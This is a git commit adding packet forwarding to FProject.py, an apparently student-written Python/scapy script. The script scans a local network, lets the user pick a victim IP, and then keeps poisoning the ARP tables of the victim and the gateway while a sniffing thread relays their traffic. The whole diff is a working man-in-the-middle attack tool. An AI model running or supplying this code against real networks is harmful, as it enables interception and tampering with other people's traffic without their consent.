1db791fcd2f4b11c7f492839b3e3a9a3bbdfb29f
naor-dighorker <naord179@gmail.com>
2022-01-03 20:19:31 +0200

    added ip forwarding

--- FProject.py
+++ FProject.py
@@ -1,8 +1,10 @@
 from scapy.all import*
+from scapy.layers.inet import IP
 from scapy.layers.l2 import ARP, Ether
 import subprocess
 import socket
 import time
+import threading
 
 DIGITS = ["1","2","3","4","5","6","7","8","9","0"]
 
@@ -35,10 +37,10 @@ def get_configs():
             break
 
     default_gateway = default_gateway.split(":")[1].strip().replace("'", "")
-    default_gateway2 = ""
+    default_gateway_ip = ""
     for c in default_gateway:
         if c in DIGITS or c == ".":
-            default_gateway2 += c
+            default_gateway_ip += c
 
     subnet = subnet_line.split(":")[1].strip()
 
@@ -48,9 +50,10 @@ def get_configs():
     for i in subnet_number:
         sum_bin += bin(int(i)).count("1")
 
-    return ip, str(sum_bin), default_gateway2
+    return ip, str(sum_bin), default_gateway_ip
 
 
+# scan for active devices on the network
 def scan(ip, subnet, gateway):
     # Set the network range
     target_range = ip + "/" + subnet
@@ -84,6 +87,7 @@ def scan(ip, subnet, gateway):
     return clients, my_mac, gateway_mac
 
 
+# finds the ip of the gateway
 def scan_gateway(default_gateway):
     # Set the target ip
     target_ip = default_gateway
@@ -106,15 +110,40 @@ def scan_gateway(default_gateway):
     return gateway_mac
 
 
-def arp_spoof(chosen_ip, spoof_ip, my_mac, victim_mac):
-        arp_packet = ARP(op=2, pdst=chosen_ip, psrc=spoof_ip, hwsrc=my_mac, hwdst=victim_mac)
+# spoofing the arp tables of the victim and the gateway
+def arp_spoof(chosen_ip, gateway_ip, my_mac, victim_mac, gateway_mac):
+    end = time.time() + 3 * 60
+    # attack again to remain in the middle
+    while time.time() < end:
+        # op 2 - is_at , sending to the victim ARP packet with my mac attached to the gateway ip
+        arp_packet = ARP(op=2, pdst=chosen_ip, psrc=gateway_ip, hwsrc=my_mac, hwdst=victim_mac)
         send(arp_packet, verbose=0)
+        # op 2 - is_at , sending to the default gateway ARP packet with my mac attached to the victim ip
+        arp_packet = ARP(op=2, pdst=gateway_ip, psrc=chosen_ip, hwsrc=my_mac, hwdst=gateway_mac)
+        send(arp_packet, verbose=0)
+        time.sleep(3)
+    print("spof")
+    return
 
 
+# forwards the packets to their normal addresses
+def packets_forwarding():
+    sniff(prn=forward, filter="ip")
+    return
+
+
+def forward(packet):
+    if packet[IP].src == chosen_ip and packet[Ether].dst == my_mac:
+        packet[Ether].dst = gateway_mac
+        sendp(packet, verbose=0)
+    elif packet[IP].src == default_gate and packet[IP].dst == chosen_ip:
+        packet[Ether].dst = chosen_mac
+        sendp(packet, verbose=0)
+    return
 
 if __name__ == '__main__':
     ip, subnet, default_gate = get_configs()
-    time.sleep(2)
+    time.sleep(1)
     clients, my_mac, gateway_mac = scan(ip, subnet, default_gate)
     print("IP" + " "*15 + "MAC")
     if clients:
@@ -122,28 +151,33 @@ if __name__ == '__main__':
             print("{}   {}".format(client['ip'], client['mac']))
     else:
         print("scan failed")
+        exit(1)
 
+    # if the scan didnt get the gateway, scan the gateway until it receives its ip
     if not gateway_mac:
         gateway_mac = scan_gateway(default_gate)
 
-    my_mac = ARP().hwsrc
-    print("5" + gateway_mac)
+    if not my_mac:
+        my_mac = ARP().hwsrc
 
+    # choose an ip of the victim
+    chosen_ip = input("Enter IP")
+    chosen_mac = ""
+    for client in clients:
+        if client['ip'] == chosen_ip:
+            chosen_mac = client['mac']
 
-    print(my_mac)
-    if my_mac and gateway_mac:
-        # choose an ip of the victim
-        chosen_ip = input("Enter IP")
-        for client in clients:
-            if client['ip'] == chosen_ip:
-                chosen_mac = client['mac']
-        while True:
-            try:
-                arp_spoof(chosen_ip, default_gate, my_mac, chosen_mac)
-                arp_spoof(default_gate, chosen_ip, my_mac, gateway_mac)
-            except KeyboardInterrupt:
-                print("finish")
-                break
+    if chosen_mac:
+        try:
+            # creates a spoofing thread
+            spoof_thread = threading.Thread(target=arp_spoof,
+                                            args=(chosen_ip, default_gate,
+                                                  my_mac, chosen_mac, gateway_mac,))
+            spoof_thread.start()
+            forwarding_thread = threading.Thread(target=packets_forwarding)
+            forwarding_thread.start()
+        except Exception:
+            print("finish")
     else:
         print("Doesnt have mac")
 
